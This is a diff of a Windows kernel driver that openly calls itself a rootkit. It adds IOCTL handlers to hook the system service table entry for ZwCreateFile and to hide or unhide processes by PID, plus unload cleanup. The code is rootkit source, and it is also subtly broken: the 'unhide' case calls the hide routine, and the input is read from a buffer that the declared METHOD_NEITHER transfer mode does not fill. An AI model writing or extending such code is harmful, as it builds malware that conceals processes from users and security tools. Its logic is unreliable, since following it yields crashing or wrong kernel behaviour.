@@ -1,8 +1,11 @@
 #pragma once
 #include <pch.h>
 
-#define SUGIOT2 0x8001
-#define IOCTL_SUGIOT1_MALWARE_COMMAND CTL_CODE(SUGIOT2, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
+#define ROOTKIT 0x8001
+#define IOCTL_ROOTKIT_HOOK_SSDT CTL_CODE(ROOTKIT, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
+#define IOCTL_ROOTKIT_UNHOOK_SSDT CTL_CODE(ROOTKIT, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
+#define IOCTL_ROOTKIT_HIDE_PROCESS CTL_CODE(ROOTKIT, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
+#define IOCTL_ROOTKIT_UNHIDE_PROCESS CTL_CODE(ROOTKIT, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)
 #define HookFuncName "ZwCreateFile"
 
 NTSTATUS DeviceControl(PDEVICE_OBJECT, PIRP Irp)
@@ -11,18 +14,45 @@ NTSTATUS DeviceControl(PDEVICE_OBJECT, PIRP Irp)
 	auto status = STATUS_SUCCESS;
 	switch (stack->Parameters.DeviceIoControl.IoControlCode)
 	{
-	case IOCTL_SUGIOT1_MALWARE_COMMAND:
-	{
+		case IOCTL_ROOTKIT_HOOK_SSDT:
+		{
+			status = HookSSDT(HookFuncName);
+			break;
+		}
+		case IOCTL_ROOTKIT_UNHOOK_SSDT:
+		{
+			status = UnHookSSDT(HookFuncName);
+			break;
+		}
+		case IOCTL_ROOTKIT_HIDE_PROCESS:
+		{
+			auto pid = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
+			if (pid == 0) 
+			{
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+			hide(*pid);
+			break;
+		}
+		case IOCTL_ROOTKIT_UNHIDE_PROCESS:
+		{
+			auto pid = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
+			if (pid == 0)
+			{
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+			hide(*pid);
+			break;
+		}
+		default:
+		{
+			status = STATUS_INVALID_DEVICE_REQUEST;
+			break;
+		}
+	}
 
-		DbgPrint("Malicious Command\n");
-		break;
-	}
-	default:
-	{
-		status = STATUS_INVALID_DEVICE_REQUEST;
-		break;
-	}
-	}
 	Irp->IoStatus.Status = status;
 	Irp->IoStatus.Information = 0;
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
@@ -41,8 +71,10 @@ NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 
 void SugiotUnload(_In_ PDRIVER_OBJECT DriverObject)
 {
-	//UnHookSSDT(HookFuncName);
-	unhide();
+	
+	unhideAll();
+	UnHookSSDT(HookFuncName);
+
 	UNICODE_STRING sym_link = RTL_CONSTANT_STRING(L"\\??\\Sugiot2");
 	IoDeleteSymbolicLink(&sym_link);
 
@@ -79,8 +111,8 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	
 	//printProcessList();
 	DbgPrint("Driver Load\n");
-	//HookSSDT(HookFuncName);
-	hide();
+	
+	
 	printProcessList();
 	return STATUS_SUCCESS;  
 
